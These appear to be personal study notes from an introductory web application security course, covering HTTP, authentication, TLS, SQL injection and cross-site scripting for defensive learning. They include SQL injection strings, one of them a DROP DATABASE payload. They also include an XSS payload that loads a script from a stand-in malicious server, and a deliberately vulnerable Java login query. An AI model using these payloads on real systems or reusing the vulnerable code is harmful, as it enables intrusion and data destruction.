#Veracode: Introduction to Web Application Security

## Working Definition
Application security is ensuring that custom application code performs as expected under the entire range of inputs.

## App Sec Concerns
Confidentiality - ISO definition: ensure info is accessible only to those authorized to have access.
Integrity - Info should only be modified by users authorized to modify it.
Availability - System is responding to *valid* user requests (e.g. handling DDoS attacks)

Traditional QA: concerned with things app is supposed to do but doesn't
App Sec: concerned with things app isn't supposed to do but does (this is what attackers focus on)

Therefore, we need both QA testing + Security testing

## Importance of App Sec
To protect valuable data.
To satisfy medical (HIPAA), financial (PCI-DSS) and commercial regulations. 


## HTTP Basics
HTTP is a clear-text protocol - data is unencrypted.
Web browser is essentially a tool to create and interpret HTTP requests and responses.

### GET
Format:
- GET
- <resource identifier, can contain parameters>
- <HTTP version>
- <Headers>

### POST 
- POST
- <resource identifier, can contain parameters>
- <HTTP version>
- <Headers>
- blank line
- <content, can contain URI parameters>

### Responses
- <HTTP version> <response code>
- <Headers>
- blank line
- <content>

### Response Codes
- 2XX: success
- 3XX: redirects
- 4XX: bad request (requested non-existent page, not authorized to access...)
- 5XX: server-side problem

### Authentication

#### HTTP Basic Auth
This is not a secure method, because base64 encoding is not an encryption method. Should use with encryption, as in HTTPS. After user supplies their credentials, the browser caches them and includes the auth header in each subsequent request. 

Format: <username><colon><password>
Encoding: base64
HTTP Header: `Authentication: Basic Z3Vlc3Q6Z3Vlc3Q=`

#### Session Authentication
This is not a secure method over HTTP because of session ID hijacking (attacker who knows the session ID could impersonate the user). Should use with encryption, as in HTTPS.

User enters credentials, server validates and returns a session identifier (a string token that is large, random, temporary, so hard to guess). Session ID is transmitted between client and server, typically using cookies.

HTTP HEADER: `Cookie: JSESSIONID=abcde12345`

### TLS (Transport Layer Security)
Man-in-the-middle: attacker with access to infrastructure between user and server. For example, an attacker can freely listen to all traffic from wireless network users in their vicinity. 

HTTPS is a form of transport layer security - it encrypts traffic at the transport layer.

Note that HTTPS does not protect from all attacks - it just protects request/response data. Attackers can craft malicious HTTP requests and send them to your application to make it behave in unexpected ways - therefore applications must always validate user inputs. 
- e.g. intercept a valid HTTPS request, modify it, then send it

In addition, other attacks are possible such as HTTPS flood/DDoS.

### Tools of the Attacker

#### Fuzzing Tools
Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program.

The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks.

Example inputs: extremely large values, empty values, absent inputs, wrong types, using reserved characters, or common attack strings

#### Web Proxies
Attackers can use web proxies to trap valid user requests and modify them (inject an attack payload) before they reach the destination server. 

## Application Attack
Attackers value these things:
- What resources are accessible from the app
  - Search functions may involve a database
  - Login pages may involve database or LDAP server, could be guessed/bypassed. Users often reuse credentials, so success could afford access to additional resources.
  - Error messages
    - Security vulnerabilities are often found when apps are put into inconsistent states or when error conditions can be invoked
  - Contact Forms
    - attackers may find email addresses to send spam/phishing messages
- Do users trust the app with sensitive info
- What are the consequences of damaging critical assets?

### Login Page
- Guess common account names/passwords, or using common defaults
- If attacker can determine the type of datastore backing the auth system, they could craft credentials that break the authentication routine.
  - Knowing the database used, attacker could use special characters. If input is not validated, attacker could cause an error (e.g. single quote for SQL database)
  - For example, response might show exception details including application code, software versions, stack traces, etc.


_Attackers often rely on the developers' failing to guard against malicious/modified inputs, or making false assumptions about inputs to the application_

### Injection Attacks

#### SQL Injection Attack

This vulnerability arises when applications pass unfiltered user inputs and static text to a SQL interpreter. The interpreter executes a query of the attacker's choosing, rather than only those specified in the application.

Sample SQL Injection attack string: `' OR 1=1 --`

How it works:
Given a vulnerable SQL statement, `SELECT * FROM User WHERE Username = '(username)' AND Password = '(password)'`

After injecting the attack string:
`SELECT * FROM User WHERE Username = '' OR 1=1 -- ' AND Password = '(password)'`

The attack string's quote allows inserting an OR TRUE condition into thewhere clause, and the original end quote for username is used to quote the remainder of the SQL statement.

Now, all rows of the User table will be returned. Perhaps the authentication system is implemented such that if a row is returned, then the login is successful.

##### Vulnerable Code Sample
```java
String username = request.getParameter("username");
Stirng password = request.getParameter("password");
String sqlStr = "SELECT * FROM USERS WHERE USERNAME=" + "'" + username + "'" + " AND PASSWORD=" + "'" + password + "'";
```

The developer has assumed the username and password will be typical strings (no spaces, alphanumeric characters only, etc). 

Attack string used as password: `'; DROP DATABASE; --

SQL statemetn after injection:
`SELECT * FROM USERS WHERE USERNAME='johndoe' AND PASSWORD=''; DROP DATABASE; -- '

The semicolon allows the attacker to append another SQL statement - in this case the database will be destroyed!

#### Other Injection Attacks
Injection attacks are an attack on the system - an instance of attackers running arbitrary code on a vulnerable system.

Injection attacks are possible any time an application includes user input in commands to other systems:
- modified LDAP requests
- modified shell commands
- modified XML

How to protect against injection attacks:
Application must scrutinize user inputs, perform appropriate validation and ensure encoding is as expected.


#### XSS (Cross-Site Scripting) Attack
XSS is an attack on users of an application, rather than the application/systems. It involves attackers inserting malicious scripts into trusted web pages - these scripts are then executed on other unsuspecting users' browsers.

Example:
A web application stores user profiles in a database from user-facing views. Administrators can view all user profiles from admin views, and the HTML looks like:

`<input type="text" name="email" value="me@gmail.com">`

An attacker updates their email to the value
`"><script src='http://maliciousserver.net/rewritepage.js' />"`

The admin view renders unfiltered/unvalidated malicious values into the Administrator user's browser:

`<input type="text" name="email" value=""><script src='http://maliciousserver.net/rewritepage.js' />"`

A script resource containing arbitrary Javascript, `rewritepage.js` is loaded from a different domain than the admin view resource. This is "cross-site scripting" - a script from a malicious site is being run.


